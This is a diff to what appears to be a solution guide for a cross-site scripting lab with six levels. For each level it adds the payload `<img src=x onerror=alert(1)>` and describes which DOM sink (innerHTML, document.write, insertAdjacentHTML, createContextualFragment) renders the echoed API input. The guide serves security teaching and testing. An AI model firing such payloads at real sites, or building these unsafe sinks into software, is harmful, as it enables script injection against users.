@@ -13,6 +13,7 @@ All levels use the same payload `<img src=x onerror=alert(1)>` in `q`.
 
 `/apidom/level1/?q=%3Cimg%20src=x%20onerror=alert(1)%3E`
 
+- payload: `<img src=x onerror=alert(1)>`
 - context: `fetch(api).then(r => r.text())` → `out.innerHTML = t`. API echoes
   `q` as `text/plain`.
 
@@ -20,6 +21,7 @@ All levels use the same payload `<img src=x onerror=alert(1)>` in `q`.
 
 `/apidom/level2/?q=%3Cimg%20src=x%20onerror=alert(1)%3E`
 
+- payload: `<img src=x onerror=alert(1)>`
 - context: `fetch(api).then(r => r.json())` → `card.innerHTML = d.html`. API
   returns `{"html": q}` as `application/json`.
 
@@ -27,6 +29,7 @@ All levels use the same payload `<img src=x onerror=alert(1)>` in `q`.
 
 `/apidom/level3/?q=%3Cimg%20src=x%20onerror=alert(1)%3E`
 
+- payload: `<img src=x onerror=alert(1)>`
 - context: `XMLHttpRequest` GET → `out.innerHTML = xhr.responseText`. API echoes
   `q` inside a `<span>`.
 
@@ -34,6 +37,7 @@ All levels use the same payload `<img src=x onerror=alert(1)>` in `q`.
 
 `/apidom/level4/?q=%3Cimg%20src=x%20onerror=alert(1)%3E`
 
+- payload: `<img src=x onerror=alert(1)>`
 - context: `fetch(api).then(r => r.json())` → `feed.insertAdjacentHTML('beforeend',
   '<li>' + d.msg + '</li>')`. API returns `{"msg": q}`.
 
@@ -41,6 +45,7 @@ All levels use the same payload `<img src=x onerror=alert(1)>` in `q`.
 
 `/apidom/level5/?q=%3Cimg%20src=x%20onerror=alert(1)%3E`
 
+- payload: `<img src=x onerror=alert(1)>`
 - context: `fetch(api).then(r => r.text())` → `document.write(t)`. API echoes a
   `<div>` wrapping `q`.
 
@@ -48,5 +53,6 @@ All levels use the same payload `<img src=x onerror=alert(1)>` in `q`.
 
 `/apidom/level6/?q=%3Cimg%20src=x%20onerror=alert(1)%3E`
 
+- payload: `<img src=x onerror=alert(1)>`
 - context: `fetch(api).then(r => r.text())` → `createContextualFragment(t)` →
   `out.appendChild(frag)`. API echoes a `<section>` wrapping `q`.
